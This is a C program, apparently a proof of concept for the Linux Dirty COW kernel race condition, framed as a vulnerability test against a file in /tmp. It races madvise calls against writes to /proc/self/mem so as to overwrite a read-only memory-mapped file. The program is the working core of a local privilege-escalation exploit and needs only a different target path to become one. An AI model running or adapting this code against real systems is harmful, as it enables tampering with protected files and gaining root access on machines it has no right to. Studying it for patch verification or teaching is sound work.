#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

void *madviseThread(void *arg) {
    for (int i = 0; i < 100000000; i++) {
        madvise(arg, 100, MADV_DONTNEED);
    }
    return NULL;
}

void *writeThread(void *arg) {
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open");
        return NULL;
    }

    char *map = (char *)arg;

    for (int i = 0; i < 100000000; i++) {
        lseek(fd, (off_t)map, SEEK_SET);
        write(fd, "MODIFIED", 8);
    }

    close(fd);
    return NULL;
}

int main() {
    int fd = open("/tmp/dcow_test_file", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    struct stat st;
    fstat(fd, &st);

    char *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

    printf("[*] Dirty COW test started...\n");
    printf("[*] If your system is vulnerable, the read-only file may change.\n");

    pthread_t p1, p2;
    pthread_create(&p1, NULL, madviseThread, map);
    pthread_create(&p2, NULL, writeThread, map);

    pthread_join(p1, NULL);
    pthread_join(p2, NULL);

    printf("[*] Test completed. Check /tmp/dcow_test_file\n");

    return 0;
}
